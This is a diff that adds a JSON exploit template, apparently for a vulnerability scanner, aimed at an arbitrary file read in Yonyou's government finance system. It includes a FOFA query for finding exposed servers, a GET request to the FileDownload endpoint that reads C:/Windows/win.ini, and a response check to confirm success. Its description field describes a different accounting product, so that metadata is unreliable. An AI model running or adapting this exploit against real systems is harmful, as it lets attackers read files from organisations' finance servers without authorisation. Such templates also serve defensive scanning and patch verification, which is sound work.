@@ -1,0 +1,36 @@
+{
+  "product": "用友政务财务系统",
+  "vul_name": "用友政务财务系统 FileDownload任意文件读取",
+  "type": "文件读取",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "用友研发的好会计财务软件是一种新型的智慧财务系统,它可以实现自动做账,通过读取税局的发票、银行的回单、出入库单据、报销单等业务凭证,进行识别后自动做账,由会计人员进行审核",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"用友-政务财务系统\" || body=\"/df/portal/getYearRgcode.do\""
+  },
+  "protocol": "http",
+  "link": "https://mp.weixin.qq.com/s/GI4TUPzmCzsj1da5ImZC_g",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/bg/attach/FileDownload?execlPath=C://Windows//win.ini"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "body": "for 16-bit app support"
+        }
+      ]
+    }
+  }
+}
